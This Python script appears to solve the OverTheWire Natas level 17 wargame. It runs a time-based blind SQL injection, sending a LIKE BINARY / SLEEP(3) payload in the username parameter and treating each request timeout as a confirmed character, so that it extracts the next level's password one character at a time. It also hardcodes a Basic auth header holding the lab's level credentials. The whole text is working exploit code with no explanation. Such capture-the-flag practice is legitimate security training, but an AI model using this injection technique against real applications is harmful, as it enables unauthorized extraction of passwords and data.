import string
from socket import timeout
from urllib.parse import urlencode
from urllib.request import Request, urlopen

username = 'natas18'
password = ''
length = 32
debug = True

headers = {
    'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
}

while len(password) != length:
    for letter in string.printable:
        try:
            sql = f"{username}\" AND password LIKE BINARY \"{password}{letter}%\" AND SLEEP(3) -- "

            query = urlencode({ 'username': sql, 'debug': debug })
            url = f"http://natas17.natas.labs.overthewire.org/index.php?{query}"

            print(f"Trying password: {password}{letter}")

            request = Request(url=url, headers=headers)

            content = urlopen(request, timeout=2).read().decode('utf-8')

        except timeout:
            password += letter
            break

        except:
            exit()
